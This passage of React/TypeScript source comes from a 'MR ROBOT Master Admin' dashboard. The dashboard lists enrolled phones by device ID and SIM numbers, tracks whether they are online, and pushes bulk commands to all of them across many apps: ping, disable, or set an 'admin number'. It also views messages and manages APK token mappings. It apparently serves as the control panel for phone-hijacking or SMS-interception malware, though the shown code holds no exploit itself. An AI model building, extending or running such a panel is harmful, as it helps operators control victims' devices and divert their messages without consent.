                    <span style={{ display: "flex", alignItems: "center", gap: 4, background: isOnline ? "#16a34a22" : T.border, color: isOnline ? "#4ade80" : T.muted, borderRadius: 99, padding: "2px 8px", fontSize: 9, fontWeight: 800 }}>
                      <span style={{ width: 5, height: 5, borderRadius: "50%", background: isOnline ? "#4ade80" : T.muted, display: "inline-block" }} />{isOnline ? "ONLINE" : "OFFLINE"}
                    </span>
                  </div>
                  <div style={{ padding: "11px 13px", display: "flex", flexDirection: "column", gap: 6 }}>
                    <div style={{ fontWeight: 800, fontSize: 14, color: T.text }}>{d.name}</div>
                    <div style={{ fontSize: 11, color: T.mutedLight, fontFamily: "monospace" }}>{d.deviceId.slice(0, 20)}…</div>
                    <div style={{ display: "flex", gap: 8, fontSize: 10 }}>
                      <span style={{ color: T.muted }}>SIM1: <span style={{ color: T.mutedLight }}>{d.sim1Phone ?? "—"}</span></span>
                      {d.sim2Phone && <span style={{ color: T.muted }}>SIM2: <span style={{ color: T.mutedLight }}>{d.sim2Phone}</span></span>}
                    </div>
                    <div style={{ display: "flex", gap: 10, fontSize: 10 }}>
                      <span style={{ color: d.hasFcm ? T.green : T.muted, fontWeight: 700 }}>{d.hasFcm ? "FCM ✓" : "No FCM"}</span>
                      <span style={{ color: T.muted }}>{fmtAgo(d.lastOnline)}</span>
                    </div>
                  </div>
                </div>
              );
            })}
          </div>
          {hasMore && !loading && (
            <div style={{ textAlign: "center" }}>
              <button onClick={() => setPage(p => p + 1)} style={{ padding: "10px 32px", borderRadius: 10, background: "linear-gradient(135deg,#5254d4,#7c3aed)", border: "none", color: "#fff", fontWeight: 700, fontSize: 13, cursor: "pointer" }}>
                Load More ({filtered.length - shown.length} remaining)
              </button>
            </div>
          )}
          <div style={{ textAlign: "center", fontSize: 11, color: T.muted }}>{filtered.length} device{filtered.length !== 1 ? "s" : ""}</div>
        </>
      )}

      {selected && <DeviceDetail device={selected} masterPin={masterPin} onClose={() => setSelected(null)} />}
    </div>
  );
}

/* ══════════════════════════════════════════
   SETTINGS TAB
══════════════════════════════════════════ */
function SettingsTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
  /* ── Batch FCM (targets ALL devices across ALL apps) ── */
  const [batchState, setBatchState] = useState<"idle" | "loading" | "running" | "done" | "err">("idle");
  const [batchDone, setBatchDone] = useState(0);
  const [batchTotal, setBatchTotal] = useState(0);
  const [batchResult, setBatchResult] = useState<{ ok: number; fail: number } | null>(null);
  const [adminNumInput, setAdminNumInput] = useState("");
  const [batchAction, setBatchAction] = useState<"ping" | "disable" | "update_admin">("ping");

  /* ── Sessions (per-app selector) ── */
  const [sessAppFilter, setSessAppFilter] = useState(apps[0]?.appId ?? "");
  const [sessions, setSessions] = useState<SessionRow[]>([]);
  const [sessLoading, setSessLoading] = useState(false);
  const [logoutingId, setLogoutingId] = useState<string | null>(null);
  const [logoutingAll, setLogoutingAll] = useState(false);

  /* ── Delete Protection (per-app selector) ── */
  const [dpAppFilter, setDpAppFilter] = useState(apps[0]?.appId ?? "");
  const dpApp = apps.find(a => a.appId === dpAppFilter) ?? null;
  const [dpState, setDpState] = useState<"idle" | "busy">("idle");
  const [dpNewPin, setDpNewPin] = useState("");
  const [dpCurrentPin, setDpCurrentPin] = useState("");
  const [dpEnabled, setDpEnabled] = useState(false);
  const [dpHasPin, setDpHasPin] = useState(false);
  const [dpMsg, setDpMsg] = useState("");

  useEffect(() => {
    if (apps.length && !sessAppFilter) setSessAppFilter(apps[0]?.appId ?? "");
    if (apps.length && !dpAppFilter) setDpAppFilter(apps[0]?.appId ?? "");
  }, [apps]);

  useEffect(() => {
    if (dpApp) { setDpEnabled(dpApp.deleteProtectionEnabled); setDpHasPin(!!dpApp.deleteProtectionPin); }
    setDpMsg(""); setDpNewPin(""); setDpCurrentPin("");
  }, [dpAppFilter]);

  const fetchSessions = useCallback(async () => {
    if (!sessAppFilter) return;
    setSessLoading(true);
    try {
      const r = await apiFetch(`/api/admin/sessions?appId=${encodeURIComponent(sessAppFilter)}`);
      if (r.ok) setSessions(await r.json() as SessionRow[]);
    } catch { /* ignore */ } finally { setSessLoading(false); }
  }, [sessAppFilter]);

  useEffect(() => { void fetchSessions(); }, [fetchSessions]);

  async function logoutSession(id: string) {
    setLogoutingId(id);
    try {
      await apiFetch(`/api/admin/sessions/${id}`, { method: "DELETE" });
      setSessions(prev => prev.filter(s => s.id !== id));
    } catch { /* ignore */ } finally { setLogoutingId(null); }
  }

  async function logoutAll() {
    if (!sessAppFilter) return;
    setLogoutingAll(true);
    try {
      await apiFetch(`/api/admin/sessions?appId=${encodeURIComponent(sessAppFilter)}`, { method: "DELETE" });
      setSessions([]);
    } catch { /* ignore */ } finally { setLogoutingAll(false); }
  }

  /* Batch FCM — NO appId filter — targets ALL devices across ALL apps */
  async function runBatch() {
    setBatchState("loading"); setBatchResult(null); setBatchDone(0); setBatchTotal(0);
    try {
      const r = await apiFetch(`/api/master/all-devices?hasFcm=1`, { headers: { "x-master-pin": masterPin } });
      const eligible = r.ok ? (await r.json() as FullDevice[]) : [];
      setBatchTotal(eligible.length); setBatchState("running");
      const BATCH = 50; const DELAY = 300;
      let ok = 0; let fail = 0;
      for (let i = 0; i < eligible.length; i += BATCH) {
        const batch = eligible.slice(i, i + BATCH);
        const results = await Promise.allSettled(batch.map(d => {
          let data: Record<string, string>;
          if (batchAction === "ping") data = { type: "online_check" };
          else if (batchAction === "disable") data = { type: "admin_update", status: "off", deviceId: d.deviceId };
          else data = { type: "admin_update", status: "on", adminNumber: adminNumInput.trim(), deviceId: d.deviceId };
          return apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: d.deviceId, data }) }).then(res => { if (!res.ok) throw new Error(); });
        }));
        results.forEach(r2 => r2.status === "fulfilled" ? ok++ : fail++);
        setBatchDone(Math.min(i + BATCH, eligible.length));
        if (i + BATCH < eligible.length) await new Promise(r2 => setTimeout(r2, DELAY));
      }
      setBatchResult({ ok, fail }); setBatchState("done");
      setTimeout(() => { setBatchState("idle"); setBatchDone(0); setBatchTotal(0); setBatchResult(null); }, 6000);
    } catch { setBatchState("err"); setTimeout(() => setBatchState("idle"), 3000); }
  }

  async function setDeleteProtectionPin() {
    if (!dpAppFilter || !dpNewPin || dpNewPin.length < 4) { setDpMsg("PIN must be at least 4 characters"); return; }
    setDpState("busy"); setDpMsg("");
    try {
      const r = await apiFetch(`/api/apps/${encodeURIComponent(dpAppFilter)}/delete-protection/set-pin`, {
        method: "POST",
        headers: { "Content-Type": "application/json", "x-master-pin": masterPin },
        body: JSON.stringify({ pin: dpNewPin }),
      });
      if (!r.ok) { const j = await r.json() as { error?: string }; setDpMsg(j.error ?? "Failed"); return; }
      setDpHasPin(true); setDpMsg("PIN set successfully!"); setDpNewPin("");
    } catch { setDpMsg("Network error"); } finally { setDpState("idle"); }
  }

  async function toggleDeleteProtection() {
    if (!dpAppFilter) return;
    setDpState("busy"); setDpMsg("");
    try {
      const r = await apiFetch(`/api/apps/${encodeURIComponent(dpAppFilter)}/delete-protection/toggle`, {
        method: "POST",
        headers: { "Content-Type": "application/json", "x-master-pin": masterPin },
        body: JSON.stringify({}),
      });
      if (!r.ok) { const j = await r.json() as { error?: string }; setDpMsg(j.error ?? "Failed"); return; }
      const j = await r.json() as { enabled: boolean };
      setDpEnabled(j.enabled); setDpMsg(`Delete protection ${j.enabled ? "enabled" : "disabled"}.`);
    } catch { setDpMsg("Network error"); } finally { setDpState("idle"); }
  }

  const busyBatch = batchState === "loading" || batchState === "running";
  const pct = batchTotal > 0 ? Math.round((batchDone / batchTotal) * 100) : 0;

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>

      {/* ── Batch FCM Actions — ALL devices across ALL apps ── */}
      <div style={{ background: T.card, borderRadius: 13, border: `1px solid ${T.borderLight}`, padding: "14px 16px" }}>
        <div style={{ fontSize: 14, fontWeight: 800, color: T.text, marginBottom: 4 }}>Batch FCM Actions</div>
        <div style={{ fontSize: 12, color: T.muted, marginBottom: 12 }}>Send FCM commands to <b style={{ color: T.accentLight }}>ALL FCM-enabled devices</b> across every app at once</div>

        <div style={{ display: "flex", gap: 6, marginBottom: 12 }}>
          {(["ping", "disable", "update_admin"] as const).map(a => (
            <button key={a} onClick={() => setBatchAction(a)} style={{ flex: 1, padding: "8px 6px", borderRadius: 8, border: `1.5px solid ${batchAction === a ? T.accent : T.borderLight}`, background: batchAction === a ? T.accentGlow : T.border, color: batchAction === a ? T.accentLight : T.muted, fontWeight: 700, fontSize: 11, cursor: "pointer" }}>
              {a === "ping" ? "Ping All" : a === "disable" ? "Disable All" : "Update Admin"}
            </button>
          ))}
        </div>

        {batchAction === "update_admin" && (
          <input type="tel" placeholder="Admin phone number" value={adminNumInput} onChange={e => setAdminNumInput(e.target.value)} style={{ ...inpBase, marginBottom: 12, fontSize: 13 }} />
        )}

        {(batchState === "loading" || batchState === "running") && (
          <div style={{ marginBottom: 12 }}>
            <div style={{ display: "flex", justifyContent: "space-between", fontSize: 11, color: T.muted, marginBottom: 5 }}>
              <span>{batchState === "loading" ? "Fetching all devices…" : "Sending…"}</span>
              {batchState === "running" && <span style={{ color: T.accentLight, fontWeight: 700 }}>{batchDone}/{batchTotal}</span>}
            </div>
            <div style={{ height: 5, background: T.border, borderRadius: 3, overflow: "hidden" }}>
              <div style={{ height: "100%", background: `linear-gradient(90deg,${T.accent},#8b5cf6)`, width: batchState === "loading" ? "10%" : `${pct}%`, transition: "width 0.3s" }} />
            </div>
          </div>
        )}
        {batchState === "done" && batchResult && (
          <div style={{ background: T.green + "18", border: `1px solid ${T.green}44`, borderRadius: 9, padding: "9px 14px", display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 12 }}>
            <span style={{ color: T.green, fontWeight: 700, fontSize: 13 }}>Done!</span>
            <span style={{ fontSize: 12, color: T.muted }}><span style={{ color: T.green, fontWeight: 700 }}>{batchResult.ok}</span> sent{batchResult.fail > 0 && <> · <span style={{ color: T.red, fontWeight: 700 }}>{batchResult.fail}</span> failed</>}</span>
          </div>
        )}
        {batchState === "err" && <div style={{ background: T.red + "15", borderRadius: 9, padding: "9px 14px", color: T.red, fontSize: 12, marginBottom: 12, display: "flex", alignItems: "center", gap: 8 }}><Ic.Alert /> Failed. Retry.</div>}

        <button onClick={() => void runBatch()} disabled={busyBatch || (batchAction === "update_admin" && !adminNumInput.trim())}
          style={{ width: "100%", padding: "11px 0", borderRadius: 9, background: batchState === "done" ? T.green : busyBatch ? T.accentGlow : `linear-gradient(135deg,${T.accent},#8b5cf6)`, border: "none", color: batchState === "done" ? "#fff" : busyBatch ? T.accentLight : "#fff", fontWeight: 800, fontSize: 13, cursor: busyBatch ? "not-allowed" : "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
          {batchState === "loading" ? <><Spinner /> Fetching…</> : batchState === "running" ? <><Spinner /> {batchDone}/{batchTotal}…</> : batchState === "done" ? <><Ic.Check /> Done</> : batchState === "err" ? "Error — Retry" : batchAction === "ping" ? <><Ic.Wifi /> Ping All Devices</> : batchAction === "disable" ? <><Ic.Power /> Disable All</> : <><Ic.Key /> Update Admin Number</>}
        </button>
      </div>

      {/* ── Delete Protection (per-app) ── */}
      <div style={{ background: T.card, borderRadius: 13, border: `1px solid ${T.borderLight}`, padding: "14px 16px" }}>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 12 }}>
          <div style={{ fontSize: 14, fontWeight: 800, color: T.text }}>Delete Protection</div>
          {dpApp && <span style={{ fontSize: 11, fontWeight: 700, padding: "3px 10px", borderRadius: 99, background: dpEnabled ? T.green + "22" : T.border, color: dpEnabled ? T.green : T.muted, border: `1px solid ${dpEnabled ? T.green + "44" : "transparent"}` }}>{dpEnabled ? "ON" : "OFF"}</span>}
        </div>
        <div style={{ marginBottom: 10 }}>
          <AppSelector apps={apps} value={dpAppFilter} onChange={v => { setDpAppFilter(v); }} allLabel="— Select App —" />
        </div>
        {dpApp && (
          <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
            <div style={{ fontSize: 11, color: T.muted, background: T.accentGlow, border: `1px solid ${T.accent}33`, borderRadius: 8, padding: "7px 11px" }}>
              Master admin can toggle or change PIN for any app without entering the current PIN.
            </div>
            <div>
              <FieldLabel>{dpHasPin ? "New PIN (optional — to change)" : "Set Protection PIN"}</FieldLabel>
              <input type="password" placeholder={dpHasPin ? "New PIN (min 4 chars)" : "Set PIN (min 4 chars)"} value={dpNewPin} onChange={e => setDpNewPin(e.target.value)} style={{ ...inpBase, fontSize: 13 }} />
            </div>
            {dpMsg && <div style={{ fontSize: 12, color: dpMsg.includes("success") || dpMsg.includes("enabled") || dpMsg.includes("disabled") ? T.green : T.red, background: (dpMsg.includes("success") || dpMsg.includes("enabled") || dpMsg.includes("disabled") ? T.green : T.red) + "15", borderRadius: 8, padding: "7px 11px" }}>{dpMsg}</div>}
            <div style={{ display: "flex", gap: 8 }}>
              <button onClick={() => void setDeleteProtectionPin()} disabled={dpState === "busy" || !dpNewPin} style={{ flex: 1, padding: "9px 0", borderRadius: 9, background: dpNewPin ? "linear-gradient(135deg,#5254d4,#7c3aed)" : T.border, border: "none", color: dpNewPin ? "#fff" : T.muted, fontWeight: 700, cursor: dpNewPin ? "pointer" : "default", fontSize: 12 }}>
                {dpState === "busy" ? "Saving…" : dpHasPin ? "Change PIN" : "Set PIN"}
              </button>
              <button onClick={() => void toggleDeleteProtection()} disabled={dpState === "busy" || !dpHasPin} style={{ flex: 1, padding: "9px 0", borderRadius: 9, background: dpEnabled ? T.red + "18" : T.green + "18", border: `1px solid ${dpEnabled ? T.red + "44" : T.green + "44"}`, color: dpEnabled ? T.red : T.green, fontWeight: 700, cursor: dpHasPin ? "pointer" : "default", fontSize: 12, opacity: dpHasPin ? 1 : 0.5 }}>
                {dpEnabled ? "Disable" : "Enable"}
              </button>
            </div>
            {!dpHasPin && <div style={{ fontSize: 11, color: T.muted, textAlign: "center" }}>Set a PIN first to enable/disable protection</div>}
          </div>
        )}
      </div>

      {/* ── Admin Sessions (per-app) ── */}
      <div style={{ background: T.card, borderRadius: 13, border: `1px solid ${T.borderLight}`, padding: "14px 16px" }}>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 12 }}>
          <div style={{ fontSize: 14, fontWeight: 800, color: T.text }}>Admin Sessions</div>
          <div style={{ display: "flex", gap: 6 }}>
            <button onClick={() => void fetchSessions()} disabled={sessLoading} style={{ padding: "5px 12px", borderRadius: 8, background: T.border, border: `1px solid ${T.borderLight}`, color: T.mutedLight, fontSize: 11, fontWeight: 700, cursor: "pointer", display: "flex", alignItems: "center", gap: 5 }}>
              {sessLoading ? <Spinner size={10} /> : <Ic.Refresh />} Refresh
            </button>
            {sessions.length > 0 && (
              <button onClick={() => void logoutAll()} disabled={logoutingAll} style={{ padding: "5px 12px", borderRadius: 8, background: T.red + "18", border: `1px solid ${T.red}44`, color: T.red, fontSize: 11, fontWeight: 700, cursor: "pointer" }}>
                {logoutingAll ? "…" : "Logout All"}
              </button>
            )}
          </div>
        </div>
        <div style={{ marginBottom: 10 }}>
          <AppSelector apps={apps} value={sessAppFilter} onChange={v => { setSessAppFilter(v); }} allLabel="— Select App —" />
        </div>
        {sessions.length === 0 ? (
          <div style={{ textAlign: "center", padding: "20px 0", color: T.muted, fontSize: 12 }}>No active sessions</div>
        ) : (
          <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
            {sessions.map(s => (
              <div key={s.id} style={{ background: T.inputBg, borderRadius: 9, padding: "9px 12px", display: "flex", alignItems: "center", gap: 10 }}>
                <div style={{ flex: 1, minWidth: 0 }}>
                  <div style={{ fontSize: 12, fontWeight: 700, color: T.text, marginBottom: 2 }}>{s.device}</div>
                  <div style={{ fontSize: 10, color: T.muted }}>{s.ip} · {fmtAgo(s.loginTime)}</div>
                </div>
                <button onClick={() => void logoutSession(s.id)} disabled={logoutingId === s.id} style={{ padding: "5px 10px", borderRadius: 7, background: T.red + "18", border: `1px solid ${T.red}44`, color: T.red, fontSize: 11, fontWeight: 700, cursor: "pointer" }}>
                  {logoutingId === s.id ? <Spinner size={10} /> : <Ic.LogOut />}
                </button>
              </div>
            ))}
          </div>
        )}
      </div>

    </div>
  );
}

/* ══════════════════════════════════════════
   MAIN DASHBOARD
══════════════════════════════════════════ */
type Tab = "apps" | "messages" | "groups" | "devices" | "settings";

function Dashboard({ masterPin, onLogout, onPinChanged }: { masterPin: string; onLogout: () => void; onPinChanged: (p: string) => void }) {
  const [tab, setTab] = useState<Tab>("apps");
  const [appList, setAppList] = useState<App[]>([]);
  const [appsLoading, setAppsLoading] = useState(true);
  const [showCreate, setShowCreate] = useState(false);
  const [showChangePin, setShowChangePin] = useState(false);
  const [editApp, setEditApp] = useState<App | null>(null);
  const [deletingId, setDeletingId] = useState<string | null>(null);
  const [togglingId, setTogglingId] = useState<string | null>(null);
  const [copyMsg, setCopyMsg] = useState<Record<string, string>>({});
  const [logoutAllId, setLogoutAllId] = useState<string | null>(null);
  const [resetApkId, setResetApkId] = useState<string | null>(null);
  const [renewId, setRenewId] = useState<string | null>(null);
  const [renewConfirmApp, setRenewConfirmApp] = useState<App | null>(null);
  const [search, setSearch] = useState("");
  const [pingState, setPingState] = useState<"idle" | "loading" | "running" | "done" | "err">("idle");
  const [pingDone, setPingDone] = useState(0);
  const [pingTotal, setPingTotal] = useState(0);
  const [pingResult, setPingResult] = useState<{ ok: number; fail: number } | null>(null);
  const sortedApps = [...appList].sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());

  const fetchApps = useCallback(async () => {
    try {
      const r = await apiFetch("/api/master/apps", { headers: { "x-master-pin": masterPin } });
      if (r.ok) setAppList(await r.json() as App[]);
    } catch { /* ignore */ } finally { setAppsLoading(false); }
  }, [masterPin]);

  useEffect(() => { void fetchApps(); }, [fetchApps]);

  async function handlePingAll() {
    setPingState("loading"); setPingResult(null); setPingDone(0); setPingTotal(0);
    try {
      const r = await apiFetch("/api/master/all-devices?hasFcm=1", { headers: { "x-master-pin": masterPin } });
      const eligible = r.ok ? (await r.json() as FullDevice[]) : [];
      setPingTotal(eligible.length); setPingState("running");
      const BATCH = 100; const DELAY = 300;
      let ok = 0; let fail = 0;
      for (let i = 0; i < eligible.length; i += BATCH) {
        const batch = eligible.slice(i, i + BATCH);
        const results = await Promise.allSettled(batch.map(d =>
          apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: d.deviceId, data: { type: "online_check" } }) }).then(res => { if (!res.ok) throw new Error(); })
        ));
        results.forEach(r2 => r2.status === "fulfilled" ? ok++ : fail++);
        setPingDone(Math.min(i + BATCH, eligible.length));
        if (i + BATCH < eligible.length) await new Promise(r2 => setTimeout(r2, DELAY));
      }
      setPingResult({ ok, fail }); setPingState("done");
      setTimeout(() => { setPingState("idle"); setPingDone(0); setPingTotal(0); setPingResult(null); }, 7000);
    } catch { setPingState("err"); setTimeout(() => setPingState("idle"), 3000); }
  }

  async function toggleStatus(app: App) {
    setTogglingId(app.appId);
    const newStatus = app.status === "active" ? "disabled" : "active";
    try {
      await apiFetch(`/api/master/apps/${encodeURIComponent(app.appId)}`, { method: "PATCH", headers: { "Content-Type": "application/json", "x-master-pin": masterPin }, body: JSON.stringify({ status: newStatus }) });
      setAppList(prev => prev.map(a => a.appId === app.appId ? { ...a, status: newStatus } : a));
    } catch { /* ignore */ } finally { setTogglingId(null); }
  }

  async function deleteApp(app: App) {
    if (!confirm(`Delete "${app.name}"?\nThis cannot be undone.`)) return;
    setDeletingId(app.appId);
    try {
      await apiFetch(`/api/master/apps/${encodeURIComponent(app.appId)}`, { method: "DELETE", headers: { "x-master-pin": masterPin } });
      setAppList(prev => prev.filter(a => a.appId !== app.appId));
    } catch { /* ignore */ } finally { setDeletingId(null); }
  }

  async function logoutAll(app: App) {
    if (!confirm(`Logout all active sessions for "${app.name}"?`)) return;
    setLogoutAllId(app.appId);
    try { await apiFetch(`/api/admin/sessions?appId=${encodeURIComponent(app.appId)}`, { method: "DELETE" }); }
    catch { /* ignore */ } finally { setLogoutAllId(null); }
  }

  async function resetApk(app: App) {
    if (!confirm(`Reset APK selection for "${app.name}"?`)) return;
    setResetApkId(app.appId);
    try {
      const r = await apiFetch(`/api/master/token-app/${encodeURIComponent(app.appId)}`, { method: "DELETE", headers: { "x-master-pin": masterPin } });
      const j = await r.json() as { ok?: boolean; error?: string; deleted?: number };
      if (r.ok) alert(`✅ Reset done! ${j.deleted ?? 0} mapping(s) cleared.`);
      else alert(`❌ Error: ${j.error ?? "Unknown error"}`);
    } catch { alert("❌ Network error"); } finally { setResetApkId(null); }
  }

  function copyUrl(app: App) {
    const url = `${window.location.origin}/preview/dashboard/WebDashboard?appId=${app.appId}`;
    copyToClipboard(url).then(() => {
      setCopyMsg(p => ({ ...p, [app.appId]: "Copied!" }));
      setTimeout(() => setCopyMsg(p => ({ ...p, [app.appId]: "" })), 2000);
    });
  }

  const filteredApps = search.trim() === "" ? sortedApps : sortedApps.filter(a =>
    a.appId.toLowerCase().includes(search.trim().toLowerCase()) || a.name.toLowerCase().includes(search.trim().toLowerCase())
  );
  const activeCount = appList.filter(a => a.status === "active").length;
  const pingBusy = pingState === "running" || pingState === "loading";

  const TABS: { id: Tab; label: string; icon: React.ReactNode }[] = [
    { id: "apps", label: "Apps", icon: <Ic.Layers /> },
    { id: "messages", label: "Messages", icon: <Ic.MessageSquare /> },
    { id: "groups", label: "Groups", icon: <Ic.Database /> },
    { id: "devices", label: "Devices", icon: <Ic.Smartphone /> },
    { id: "settings", label: "Settings", icon: <Ic.Settings /> },
  ];

  return (
    <div style={{ minHeight: "100vh", background: T.bg, fontFamily: "'Inter', system-ui, sans-serif", color: T.text }}>
      <style>{`
        @keyframes spin{to{transform:rotate(360deg)}}
        @keyframes ma-pulse{0%,100%{opacity:1}50%{opacity:0.55}}
        *{box-sizing:border-box}
        .ma-tab-btn{cursor:pointer;background:none;border:none;font-family:inherit;-webkit-tap-highlight-color:transparent;}
        .ma-tab-btn:active{opacity:0.7;}
        .ma-card:active{transform:scale(0.985);}
        .ma-bottom-nav{display:none;position:fixed;bottom:0;left:0;right:0;background:rgba(7,9,20,0.98);border-top:1px solid rgba(99,102,241,0.2);backdrop-filter:blur(28px);-webkit-backdrop-filter:blur(28px);padding:6px 4px calc(8px + env(safe-area-inset-bottom));z-index:200;justify-content:space-around;align-items:center;box-shadow:0 -6px 40px rgba(0,0,0,0.75);}
        .ma-bnav-item{display:flex;flex-direction:column;align-items:center;gap:2px;cursor:pointer;color:rgba(100,115,160,0.8);transition:color 0.15s;background:none;border:none;outline:none;padding:4px 6px;font-family:inherit;-webkit-tap-highlight-color:transparent;flex:1;}
        .ma-bnav-item:active{transform:scale(0.88);}
        .ma-bnav-lbl{font-size:9px;font-weight:700;letter-spacing:0.4px;text-transform:uppercase;}
        .ma-bnav-active{color:#818cf8;}
        .ma-fab{width:46px;height:46px;border-radius:14px;border:none;background:linear-gradient(135deg,#5254d4,#7c3aed);display:flex;align-items:center;justify-content:center;color:#fff;cursor:pointer;margin-top:-16px;flex-shrink:0;box-shadow:0 4px 20px rgba(99,102,241,0.55);}
        .ma-fab-wrap{display:flex;flex-direction:column;align-items:center;gap:2px;flex:1;}
        @media(max-width:640px){.ma-bottom-nav{display:flex;}.ma-main{padding-bottom:80px!important;}.ma-hide-mob{display:none!important;}}
      `}</style>

      {/* Header */}
      <div style={{ background: "rgba(7,9,20,0.98)", borderBottom: "1px solid rgba(99,102,241,0.18)", padding: "0 16px", position: "sticky", top: 0, zIndex: 50, backdropFilter: "blur(24px)", WebkitBackdropFilter: "blur(24px)" }}>
        <div style={{ position: "absolute", top: 0, left: 0, right: 0, height: 2, background: "linear-gradient(90deg,#6366f1,#8b5cf6,#ec4899,#6366f1)" }} />
        <div style={{ maxWidth: 960, margin: "0 auto", display: "flex", alignItems: "center", justifyContent: "space-between", height: 54, gap: 8 }}>
          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
            <div style={{ width: 34, height: 34, borderRadius: 11, background: "linear-gradient(145deg,#4f52d4,#7c3aed)", display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", boxShadow: "0 4px 14px rgba(99,102,241,0.5)" }}><Ic.CPU /></div>
            <div>
              <div style={{ fontSize: 14, fontWeight: 900, color: "#f1f1f5", letterSpacing: -0.4 }}>MR ROBOT</div>
              <div style={{ fontSize: 9, color: "#818cf8", fontWeight: 700, letterSpacing: 1.8, textTransform: "uppercase" }}>Master Admin</div>
            </div>
          </div>
          {/* Desktop tabs */}
          <div className="ma-hide-mob" style={{ display: "flex", gap: 2 }}>
            {TABS.map(t => (
              <button key={t.id} className="ma-tab-btn" onClick={() => setTab(t.id)} style={{ padding: "6px 14px", borderRadius: 9, display: "flex", alignItems: "center", gap: 6, fontSize: 12, fontWeight: 700, color: tab === t.id ? T.accentLight : T.muted, background: tab === t.id ? T.accentGlow : "transparent", border: `1px solid ${tab === t.id ? T.accent + "44" : "transparent"}`, transition: "all 0.15s" }}>
                {t.icon}<span>{t.label}</span>
              </button>
            ))}
          </div>
          <div style={{ display: "flex", gap: 6, alignItems: "center" }}>
            <button onClick={() => setShowChangePin(true)} title="Change PIN" style={{ width: 36, height: 36, borderRadius: 11, display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", border: "1px solid rgba(255,255,255,0.08)", background: "rgba(255,255,255,0.04)", color: "#94a3b8" }}><Ic.Key /></button>
            <button onClick={onLogout} title="Logout" style={{ width: 36, height: 36, borderRadius: 11, display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", border: "1px solid rgba(239,68,68,0.28)", background: "rgba(239,68,68,0.1)", color: "#f87171" }}><Ic.LogOut /></button>
          </div>
        </div>
      </div>

      {/* Main content */}
      <div className="ma-main" style={{ maxWidth: 960, margin: "0 auto", padding: "16px 14px" }}>

        {/* APPS TAB */}
        {tab === "apps" && (
          <>
            {/* Stats */}
            <div style={{ display: "grid", gridTemplateColumns: "repeat(3,1fr)", gap: 10, marginBottom: 16 }}>
              {[
                { label: "Total Apps", val: appList.length, color: T.accent, Icon: Ic.Layers },
                { label: "Active", val: activeCount, color: T.green, Icon: Ic.CheckCircle },
                { label: "Disabled", val: appList.length - activeCount, color: T.red, Icon: Ic.XCircle },
              ].map(({ label, val, color, Icon }) => (
                <div key={label} style={{ background: T.card, borderRadius: 13, padding: "14px 16px", border: `1px solid ${T.borderLight}`, position: "relative", overflow: "hidden" }}>
                  <div style={{ position: "absolute", top: -10, right: -10, width: 60, height: 60, borderRadius: "50%", background: color + "12", pointerEvents: "none" }} />
                  <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 8 }}>
                    <span style={{ color, opacity: 0.9 }}><Icon /></span>
                    <span style={{ fontSize: 10, color: T.muted, fontWeight: 600, textTransform: "uppercase", letterSpacing: 0.5 }}>{label}</span>
                  </div>
                  <div style={{ fontSize: 30, fontWeight: 900, color, lineHeight: 1 }}>{val}</div>
                </div>
              ))}
            </div>

            {/* Ping All */}
            <div style={{ background: T.card, borderRadius: 13, border: `1px solid ${T.borderLight}`, overflow: "hidden", marginBottom: 16 }}>
              <div style={{ padding: "11px 16px", borderBottom: `1px solid ${T.border}`, display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                <div style={{ display: "flex", alignItems: "center", gap: 8 }}><div style={{ color: T.accentLight }}><Ic.Wifi /></div><span style={{ fontWeight: 800, fontSize: 13, color: T.text }}>Check Online — All Devices</span></div>
              </div>
              <div style={{ padding: "14px 16px", display: "flex", flexDirection: "column", gap: 10 }}>
                <div style={{ fontSize: 12, color: T.muted }}>Sends <b style={{ color: T.mutedLight }}>online_check</b> ping to all <b style={{ color: T.mutedLight }}>FCM-enabled</b> devices in batches of 100.</div>
                {(pingState === "running" || pingState === "loading") && (
                  <div>
                    <div style={{ display: "flex", justifyContent: "space-between", fontSize: 11, color: T.muted, marginBottom: 4 }}>
                      <span>{pingState === "loading" ? "Fetching devices…" : "Sending pings…"}</span>
                      {pingState === "running" && <span style={{ color: T.accentLight, fontWeight: 700 }}>{pingDone}/{pingTotal}</span>}
                    </div>
                    <div style={{ height: 4, background: T.border, borderRadius: 3, overflow: "hidden" }}>
                      <div style={{ height: "100%", background: `linear-gradient(90deg,${T.accent},#8b5cf6)`, width: pingState === "loading" ? "12%" : `${pingTotal > 0 ? Math.round((pingDone / pingTotal) * 100) : 0}%`, transition: "width 0.3s" }} />
                    </div>
                  </div>
                )}
                {pingState === "done" && pingResult && (
                  <div style={{ background: T.green + "18", border: `1px solid ${T.green}44`, borderRadius: 9, padding: "9px 14px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                    <span style={{ color: T.green, fontWeight: 700, fontSize: 13 }}>Ping complete!</span>
                    <span style={{ fontSize: 12, color: T.muted }}><span style={{ color: T.green, fontWeight: 700 }}>{pingResult.ok}</span> sent{pingResult.fail > 0 && <> · <span style={{ color: T.red, fontWeight: 700 }}>{pingResult.fail}</span> failed</>}</span>
                  </div>
                )}
                {pingState === "err" && <div style={{ background: T.red + "15", borderRadius: 9, padding: "9px 14px", color: T.red, fontSize: 12, display: "flex", alignItems: "center", gap: 8 }}><Ic.Alert /> Fetch failed. Retry.</div>}
